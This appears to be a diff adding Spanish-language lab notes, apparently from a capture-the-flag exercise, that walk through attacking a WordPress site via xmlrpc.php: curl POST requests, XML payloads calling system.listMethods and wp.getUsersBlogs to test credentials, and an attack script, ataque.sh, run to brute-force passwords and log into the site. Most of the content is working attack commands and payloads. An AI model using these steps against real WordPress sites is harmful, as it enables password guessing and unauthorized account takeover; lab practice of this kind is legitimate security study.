@@ -1,3 +1,51 @@
+SI VEMOS UN WORDPRESS poner IP/xmlrpc.php
+(NOS SALDRÁ ALGO COMO ACCEPTS POST RREQUEST ONLY)
+KALI: curl –X POST ‘http://IP/xmlrpc.php’
+nano enviar.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+
+GUARDAR.
+curl -X POST http://10.10.126.89/xmlrpc.php -d @enviar.xml
+
+
+(TE DA UNA RESPUESTA LARGA)
+nano enviar.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param>
+      <value><string>your_username</string></value>
+    </param>
+    <param>
+      <value><string>your_password</string></value>
+    </param>
+  </params>
+</methodCall>
+
+
+Meto el usuario, y una contraseña inventada. Lo envío y me dice incorrect username or password: 
+
+curl -X POST http://10.10.126.89/xmlrpc.php -d @enviar.xml
+
+nano ataque.sh
+
+
+
+
+
+
+
+
+
+
+
 #!/bin/bash
 
 function salir() {
@@ -34,3 +82,12 @@ sleep 1
 rm log.log enviar.xml
 
 done
+
+
+
+
+
+EJECUTAR: ./ataque.sh
+
+Nos salen las contraseñas y nos metemos en el wordpress.
+
